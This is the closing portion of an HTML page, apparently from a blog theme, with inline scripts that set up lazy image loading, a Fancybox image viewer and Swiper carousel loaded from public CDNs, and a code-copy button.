  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
